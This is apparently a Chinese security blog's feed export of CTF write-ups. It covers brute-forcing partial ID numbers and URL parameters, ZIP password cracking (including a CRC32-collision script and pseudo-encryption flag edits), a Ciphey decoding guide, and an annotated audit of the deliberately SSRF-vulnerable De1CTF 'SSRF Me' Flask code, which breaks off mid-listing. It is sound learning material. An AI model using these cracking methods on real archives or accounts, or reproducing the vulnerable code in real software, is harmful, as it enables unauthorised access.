<p><img src="http://img.npfs06.top/20210223152952.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2><p>打开页面是正方教务系统，仔细点看下面有个录取名单，和 学生学籍信息查询系统</p>
<p>点录取名单，内容如下</p>
<p><img src="http://img.npfs06.top/20210223153008.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>可以看到身份证号不完全，少了生日（年月日），这里要爆破</p>
<p><img src="http://img.npfs06.top/20210223153019.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>爆破出来，学生学籍信息查询系统 查询之后会提示，教务系统用户名，以及登入初始密码为身份证</p>
<p>登入即可得到flag</p>
<p><img src="http://img.npfs06.top/20210223153033.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h2><p><img src="http://img.npfs06.top/20210223153055.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>看到这个url，诡异的0和1，尝试爆破</p>
<p><img src="http://img.npfs06.top/20210223153106.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><a href="https://blog.csdn.net/qq_39101049/article/details/90234669" target="_blank">burpsuite爆破的四种模式</a></p>
<p>这里要把2.txt去掉</p>
<p>使用Cluster bomb模式爆破从0-100的数字</p>
<p><img src="http://img.npfs06.top/20210223153119.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
]]></content>
      <categories>
        <category>web入门</category>
      </categories>
  </entry>
  <entry>
    <title>CTF压缩包分析</title>
    <url>/2020/04/11/CTF%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>CTF中常见的压缩包题型总结</p>
<a id="more"></a>

<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><p> 利用 ARCHPR  </p>
<h1 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h1><p>明文攻击指的是有一个加密的ZIP和一个未加密的压缩包中包含的文件，由于同一个ZIP压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以使用已知文件推测出密钥并解密ZIP文件的攻击方式。</p>
<h2 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h2><p>假设题目提供了一张图片和一个压缩包，发现压缩包加密，且压缩包中有一张图片和外面的图片命名是一样的，猜测为明文攻击。使用软件将图片进行压缩后发现，压缩包中的图片和压缩后的图片的CRC32值是一样的，确认为明文攻击。</p>
<h2 id="做法："><a href="#做法：" class="headerlink" title="做法："></a>做法：</h2><p>打开ARCHPR，打开待解密的压缩包，选择“攻击类型”为“明文”，点击“明文”选项选择刚才将图片压缩的压缩包。点击“开始”后就开始进行破解，得到密钥。</p>
<p>【注：不同的压缩软件使用的压缩算法不同，自行压缩的那个压缩包需要同题目给的压缩包的压缩算法一直才能进行明文攻击（常见压缩软件：好压、winRAR、7z、快压、360压缩）】</p>
<h1 id="ARCHPR掩码"><a href="#ARCHPR掩码" class="headerlink" title="ARCHPR掩码"></a>ARCHPR掩码</h1><p>选择攻击类型为掩码，abc???,abc为已知字符，???代表未知字符（用三个问号表示）</p>
<h1 id="CRC32碰撞-适合字节小的压缩包文件"><a href="#CRC32碰撞-适合字节小的压缩包文件" class="headerlink" title="CRC32碰撞(适合字节小的压缩包文件)"></a>CRC32碰撞(适合字节小的压缩包文件)</h1><p>CRC的全称是循环冗余校验(Cyclic Redundancy Check, CRC)，不同长度的常数对应着不同的CRC实现算法，可用来校验文件是否出错但并不能用于自动纠错。</p>
<h2 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h2><p>题目解压打开发现有多个压缩包可尝试CRC32碰撞</p>
<h2 id="做法：-1"><a href="#做法：-1" class="headerlink" title="做法："></a>做法：</h2><p>编写脚本，尝试使用CRC32碰撞还原出所有压缩包中文件的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">参考大神写的脚本</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span>(<span class="params">crc</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="comment">#for q in dic:</span></span><br><span class="line">                    s = i + j + p</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line"><span class="comment">#在 Python 2.x 的版本中，binascii.crc32 所计算出來的 CRC 值域为[-2^31, 2^31-1] 之间的有符号整数，为了要与一般CRC结果作比对，需要将其转为无符号整数，所以加上&amp; 0xffffffff来进行转换。如果是 Python 3.x 的版本，其计算结果为 [0, 2^32-1] 间的无符号整数，因此不需额外加上&amp; 0xffffffff</span></span><br><span class="line">                        <span class="comment">#print s</span></span><br><span class="line">                        f.write(s)	</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span>():</span></span><br><span class="line">    <span class="keyword">for</span> I <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">        file = <span class="string">&#x27;flag&#x27;</span> + <span class="built_in">str</span>(I) + <span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">        f = zipfile.ZipFile(file, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        <span class="comment">#以上3行为获取压缩包CRC32值的步骤</span></span><br><span class="line">        <span class="comment">#print hex(crc)</span></span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"> </span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">&#x27;+/=&#x27;</span></span><br><span class="line"> </span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果压缩包文件为6字节</p>
<p>可利用工具<a href="https://github.com/theonlypwner/crc32">https://github.com/theonlypwner/crc32 </a></p>
<p>使用方法：<br><code>python crc32.py reverse crc32密文(16进制形式)</code></p>
<h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><blockquote>
<p>组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志<br>ZIP的文件头标识固定为0×50 4B 03 04<br>核心目录区的标记为0x 50 4B 01 02<br>核心目录结束标记0×50 4B 05 06 </p>
</blockquote>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>查看压缩源文件目录区的全布局方式标记</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">50 4B<span class="number"> 01 </span>02 3F<span class="number"> 00 </span>14<span class="number"> 00 </span>09 00</span><br><span class="line">第9、10位00 00，即为全布局方式标记，由此判断有无加密（伪加密的关键）</span><br><span class="line">【注：全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性！】 </span><br><span class="line">第二个数字为奇数时 –&gt;加密 </span><br><span class="line">第二个数字为偶数时 –&gt;未加密</span><br></pre></td></tr></table></figure>
<h2 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h2><p>将全局方式位标记改为00 00</p>
<h1 id="图片中隐藏压缩包"><a href="#图片中隐藏压缩包" class="headerlink" title="图片中隐藏压缩包"></a>图片中隐藏压缩包</h1><p>binwalk或foremost分离</p>
<p>以jpg文件为例，jpg文件以FF D9结尾，而图片浏览器会忽略FF D9后面的内容，此次可在其后面加入其它文件</p>
<p>针对此类题目，可将图片拖进十六进制编辑器，观察文件格式</p>
<p>或者直接拉进kali binwalk/foremost  扫描分离</p>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2014-4210</title>
    <url>/2021/08/19/CVE-2014-4210/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ff1575c125b2a9280f99a38287cdb10354a9106f3e0e312947f35e85f0e3a68b"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>Ciphey--解密神器</title>
    <url>/2021/10/10/Ciphey-%E8%A7%A3%E5%AF%86%E7%A5%9E%E5%99%A8/</url>
    <content><![CDATA[<p>Ciphey–解密神器<a id="more"></a></p>
<h1 id="Ciphey是什么？"><a href="#Ciphey是什么？" class="headerlink" title="Ciphey是什么？"></a>Ciphey是什么？</h1><p>输入加密文本，取回解密文本。</p>
<blockquote>
<p>“什么类型的加密？”</p>
</blockquote>
<p>这才是重点。你不知道，<strong>你只知道它可能是加密的。Ciphey 会为你解决这个问题</strong>。</p>
<p>Ciphey 可以在 3 秒或更短的时间内解决大多数事情。</p>
<p><strong>使用自然语言处理和人工智能以及一些常识的全自动解密/解码/破解工具。</strong></p>
<p>Ciphey 旨在成为自动化许多解密和解码的工具，例如多基编码、经典密码、散列或更高级的密码学。</p>
<p>如果您对密码学不太了解，或者您想在自己动手之前快速检查密文，那么 Ciphey 适合您。</p>
<p>Ciphey 使用自定义构建的人工智能模块 ( <em>AuSearch</em> ) 和<em>密码检测接口</em>来近似加密的内容。然后是定制的、可定制的自然语言处理<em>语言检查器界面</em>，它可以检测给定文本何时变为纯文本。</p>
<p>这里没有神经网络或臃肿的人工智能。我们只使用快速和最小的东西。</p>
<p>而这只是冰山一角。有关完整的技术说明，请查看我们的<a href="https://github.com/Ciphey/Ciphey/wiki">文档</a>。</p>
<h2 id="支持破解的密码列表"><a href="#支持破解的密码列表" class="headerlink" title="支持破解的密码列表"></a>支持破解的密码列表</h2><h3 id="基本加密"><a href="#基本加密" class="headerlink" title="基本加密"></a>基本加密</h3><ul>
<li>Caesar Cipher-凯撒密码</li>
<li>ROT47（使用 ROT47 字母高达 ROT94）</li>
<li>ASCII 移位（高达 ROT127，带有完整的 ASCII 字母表）</li>
<li>Vigenère Cipher-维吉尼亚密码</li>
<li>Affine Cipher-仿射密码</li>
<li>Binary Substitution Cipher-二进制替换密码 (XY-Cipher)</li>
<li>Baconian Cipher -培根密码（两种变体）</li>
<li>Soundex</li>
<li>Transposition Cipher-转置密码</li>
<li>Pig Latin-猪拉丁语</li>
</ul>
<h3 id="现代密码学"><a href="#现代密码学" class="headerlink" title="现代密码学"></a>现代密码学</h3><ul>
<li>Repeating-key XOR-重复键异或</li>
<li>Single XOR-单异或</li>
</ul>
<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p><a href="https://github.com/Ciphey/Ciphey/wiki/Common-Issues-&-Their-Solutions#why-do-you-have-a-lot-of-encodings-you-should-work-on-real-world-ciphers-more">为什么你有很多解码器？</a></p>
<ul>
<li>Base2（二进制）</li>
<li>Base8（八进制）</li>
<li>Base10（十进制）</li>
<li>Base16（十六进制）</li>
<li>Base32</li>
<li>Base58 比特币</li>
<li>Base58 Flickr（发布候选阶段）</li>
<li>Base58 Ripple</li>
<li>Base62</li>
<li>Base64</li>
<li>Base64 URL（发布候选阶段）</li>
<li>Base69</li>
<li>Base85</li>
<li>Z85（发布候选阶段）</li>
<li>ASCII Base85</li>
<li>Base91</li>
<li>Base65536（发布候选阶段）</li>
<li>ASCII</li>
<li>Reversed text-<strong>反转文字</strong></li>
<li>Morse Code-摩尔斯电码</li>
<li>DNA codons-DNA 密码子（释放候选阶段）</li>
<li>Atbash</li>
<li>Standard Galactic Alphabet-标准银河字母表（又名 Minecraft Enchanting Language）</li>
<li>Leetspeak</li>
<li>Baudot ITA2</li>
<li>URL encoding-网址编码</li>
<li>SMS Multi-tap</li>
<li>DMTF（发布候选阶段）</li>
<li>A1Z26（发布候选阶段）</li>
<li>Prisoner’s Tap Code-囚犯的窃听代码</li>
<li>UUencode</li>
<li>Braille-盲文（1 级）</li>
</ul>
<h3 id="深奥的语言-EsoLang"><a href="#深奥的语言-EsoLang" class="headerlink" title="深奥的语言 (EsoLang)"></a>深奥的语言 (EsoLang)</h3><ul>
<li>Brainfuck-脑残</li>
</ul>
<h3 id="压缩方法"><a href="#压缩方法" class="headerlink" title="压缩方法"></a>压缩方法</h3><ul>
<li>GZip</li>
</ul>
<h3 id="哈希值"><a href="#哈希值" class="headerlink" title="哈希值"></a>哈希值</h3><p><strong>注意：由于我们无法控制的外部服务的一些错误，哈希现在被关闭。</strong></p>
<p>Ciphey 支持 272 个哈希。</p>
<ul>
<li>MD5</li>
<li>SHA-1</li>
<li>SHA-256</li>
<li>SHA-384</li>
<li>SHA-512</li>
</ul>
<h1 id="Ciphey安装方法"><a href="#Ciphey安装方法" class="headerlink" title="Ciphey安装方法"></a>Ciphey安装方法</h1><table>
<thead>
<tr>
<th><a href="https://pypi.org/project/ciphey">🐍 Python</a></th>
<th><a href="https://hub.docker.com/r/remnux/ciphey">🐋 Docker (Universal)</a></th>
<th><a href="https://ports.macports.org/port/ciphey/summary">🍎 MacPorts (macOS)</a></th>
<th><a href="https://formulae.brew.sh/formula/ciphey">🍺 Homebrew (macOS/Linux)</a></th>
</tr>
</thead>
<tbody><tr>
<td><a href="https://github.com/Ciphey/Ciphey/raw/master/Pictures_for_README/python.png"><img src="https://github.com/Ciphey/Ciphey/raw/master/Pictures_for_README/python.png" alt="img"></a></td>
<td><a href="https://github.com/Ciphey/Ciphey/raw/master/Pictures_for_README/docker.png"><img src="https://github.com/Ciphey/Ciphey/raw/master/Pictures_for_README/docker.png" alt="img"></a></td>
<td><a href="https://github.com/Ciphey/Ciphey/raw/master/Pictures_for_README/macports.png"><img src="https://github.com/Ciphey/Ciphey/raw/master/Pictures_for_README/macports.png" alt="img"></a></td>
<td><a href="https://github.com/Ciphey/Ciphey/raw/master/Pictures_for_README/homebrew.png"><img src="https://github.com/Ciphey/Ciphey/raw/master/Pictures_for_README/homebrew.png" alt="img"></a></td>
</tr>
<tr>
<td><code>python3 -m pip install ciphey --upgrade</code></td>
<td><code>docker run -it --rm remnux/ciphey</code></td>
<td><code>sudo port install ciphey</code></td>
<td><code>brew install ciphey</code></td>
</tr>
</tbody></table>
<p>要安装 Ciphey，您需要 2 个核心内容：</p>
<ol>
<li>Python3.7或以上</li>
<li>Pip（在 Python 3 上）</li>
</ol>
<p>检查 Python 是否已经安装。运行这两个命令：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">&quot;import sys; print(sys.version)&quot;</span></span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">pytho<span class="symbol">n3</span> -c <span class="string">&quot;import sys; print(sys.version)&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果安装了 Python，这些命令之一将运行并输出版本号。Ciphey 只支持大于 3.7 的数字。如果您看到“2”或“3.7”以下的任何内容，我们将需要安装更新的版本。</p>
<h2 id="安装Ciphey"><a href="#安装Ciphey" class="headerlink" title="安装Ciphey"></a>安装Ciphey</h2><p>在 Linux 上运行以下命令：</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">python3 -m pip <span class="keyword">install</span> -U ciphey</span><br></pre></td></tr></table></figure>
<p><strong>Ciphey 仅支持 Python3.7 及以上版本。如果您的版本低于 3.7，请升级 Python 或使用 Docker 镜像。</strong></p>
<p><strong>⚠️ Windows Python 默认安装 32 位。Ciphey 仅支持 64 位。确保您使用的是 64 位 Python。</strong></p>
<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><h2 id="ciphey命令参数"><a href="#ciphey命令参数" class="headerlink" title="ciphey命令参数"></a>ciphey命令参数</h2><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">ciphey <span class="comment">--help</span></span><br><span class="line">用法: ciphey [选项] [TEXT_STDIN]</span><br><span class="line"></span><br><span class="line">  Ciphey - 自动解密工具</span><br><span class="line"></span><br><span class="line">  文档地址: <span class="keyword">https</span>://github.com/Ciphey/Ciphey/wiki</span><br><span class="line"></span><br><span class="line">  Discord (这里支持，我们大部分时间都在线):</span><br><span class="line">  <span class="keyword">https</span>://discord.ciphey.online/</span><br><span class="line"></span><br><span class="line">  GitHub: <span class="keyword">https</span>://github.com/ciphey/ciphey</span><br><span class="line"></span><br><span class="line"> cipher是一种使用智能人工智能的自动解密工具</span><br><span class="line">和自然语言处理。输入加密文本，获取解密文本</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  例如:</span><br><span class="line"></span><br><span class="line">      基本用法: ciphey -t <span class="string">&quot;aGVsbG8gbXkgbmFtZSBpcyBiZWU=&quot;</span></span><br><span class="line"></span><br><span class="line">选项:</span><br><span class="line">  -t, <span class="comment">--text TEXT            您想要解密的密文。</span></span><br><span class="line">  -q, <span class="comment">--quiet                减少冗长的显示,直接给结果</span></span><br><span class="line">  -g, <span class="comment">--greppable            只输出答案(对于grep很有用)</span></span><br><span class="line">  -v, <span class="comment">--verbose</span></span><br><span class="line">  -C, <span class="comment">--checker TEXT         使用给定的检查器</span></span><br><span class="line">  -c, <span class="comment">--config TEXT          使用给定的配置文件。默认为</span></span><br><span class="line">                             appdirs.user_config_dir(<span class="string">&#x27;ciphey&#x27;</span>,</span><br><span class="line">                             <span class="string">&#x27;ciphey&#x27;</span>)/<span class="string">&#x27;config.yml&#x27;</span></span><br><span class="line"></span><br><span class="line">  -w, <span class="comment">--wordlist TEXT        使用给定的密码字典</span></span><br><span class="line">  -p, <span class="comment">--param TEXT           将参数传递给语言检查器</span></span><br><span class="line">  -l, <span class="comment">--list-params BOOLEAN  列出所选模块的参数</span></span><br><span class="line">  <span class="comment">--searcher TEXT            选择要使用的搜索算法</span></span><br><span class="line">  -b, <span class="comment">--bytes                强制密码使用二进制模式作为输入</span></span><br><span class="line">  <span class="comment">--default-dist TEXT        设置默认的字符/字节分布</span></span><br><span class="line">  -m, <span class="comment">--module PATH          从给定路径添加模块</span></span><br><span class="line">  -A, <span class="comment">--appdirs              输出密码到想要的文件位置</span></span><br><span class="line"></span><br><span class="line">  -f, <span class="comment">--file FILENAME</span></span><br><span class="line">  <span class="comment">--help                     显示此帮助消息并退出。</span></span><br></pre></td></tr></table></figure>


<p>这里以前几天鹤城杯的一道题目为例进行演示</p>
<img src="http://img.npfs06.top/20211010003132.png" style="zoom:80%;">



<img src="http://img.npfs06.top/20211010003329.png" style="zoom:80%;">

<p>成功解密</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>DelCTF2019 SSRF Me</title>
    <url>/2020/07/17/DelCTF2019-SSRF-Me/</url>
    <content><![CDATA[<p>第一次审计这么长的代码，很值得记录一下<a id="more"></a></p>
<h1 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h1><p>以下是审计过程中的一些笔记</p>
<p><img src="https://img.npfs06.top/20210326205524.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210326205534.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210326205544.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"><span class="comment">#_init_初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一个if：如果checkSign(self) 返回 True ，则进入下一个if</span></span><br><span class="line"><span class="comment">#审计checkSign(self)</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line"><span class="comment">#如果scan在action里面，则我们可以让param进入scan这个函数，并的目录下创建一个result.txt </span></span><br><span class="line"><span class="comment">#然后通过scan()函数把名字为param的网址里的内容写到result.txt中，由于param是可控的，所以很容易想到这里把flag.txt传给param。</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"><span class="comment">#如果read在action里面，则我们可以读取读取result.txt的内容赋值给result</span></span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action,self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#如果getSign(self.action, self.param)和self.sign相等则返回True ,否则返回False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="comment">#提取get方法传入的，参数名叫param对应得值，并将其url编码后赋值给param</span></span><br><span class="line"><span class="comment">#将scan赋值给action</span></span><br><span class="line"><span class="comment">#审计 getSign()</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="comment">#以get方法传入param参数值，在cookie里面传递action和sign的值</span></span><br><span class="line"><span class="comment">#使param绕过waf，审计waf</span></span><br><span class="line"><span class="comment">#用我们传进去的 action 、 param  、sign  、ip 这四个参数构造一个Task类对象，并且执行它的Exec方法</span></span><br><span class="line"><span class="comment">#审计Task</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span 